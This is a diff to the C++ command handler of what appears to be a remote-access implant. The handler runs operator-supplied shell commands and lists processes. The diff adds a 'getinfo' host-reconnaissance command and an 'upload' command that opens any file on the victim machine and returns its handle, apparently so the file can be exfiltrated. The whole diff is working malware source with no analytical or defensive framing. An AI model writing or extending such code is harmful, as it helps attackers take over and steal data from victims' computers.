@@ -36,9 +36,9 @@ process_command(
 
 
 #ifdef BAPHOMET_DEBUG
-    std::cout << "[+] Command chunks:" << std::endl;
+    printf("[+] Command chunks:\n");
     for(size_t i = 0; i < args.size(); i++) {
-        std::cout << " - " << args[i] << std::endl;
+        printf(" - %s\n", args[i].c_str());
     }
 #endif
 
@@ -70,8 +70,8 @@ process_command(
         return { format_output(tasking::shell_command(args[1], true)), nullptr, output_type::PLAIN_TEXT };
     } if (cmd_name == "cmd") {
         return { format_output(tasking::shell_command(args[1], false)), nullptr, output_type::PLAIN_TEXT };
-    } if(cmd_name == "die") {
-        return { format_output("Exiting..."), nullptr, output_type::PLAIN_TEXT };
+    } if(cmd_name == "getinfo") {
+        return { format_output(recon::generate_basic_info()), nullptr, output_type::PLAIN_TEXT };
     }
 
 
@@ -81,12 +81,22 @@ process_command(
         if(procs.size() > 15000) {
             HANDLE hprocs = tasking::write_into_file(procs, "pr.txt", procs.size(), true);
             if(hprocs == nullptr) {
-                return {"Failed to create output file for process report.", nullptr, output_type::PLAIN_TEXT};
+                return {format_output("Failed to create output file for process report."), nullptr, output_type::PLAIN_TEXT};
             }
             return {"", hprocs, output_type::FILE};
         }
 
         return { procs, nullptr, output_type::PLAIN_TEXT };
+    }
+
+
+    if(cmd_name == "upload") {
+        HANDLE hfile = tasking::get_file_handle(args[1]);
+        if(hfile == nullptr) {
+            return { format_output(io::win32_failure("upload", "CreateFileA")), nullptr, output_type::PLAIN_TEXT };
+        }
+
+        return {"", hfile, output_type::FILE };
     }
 
 
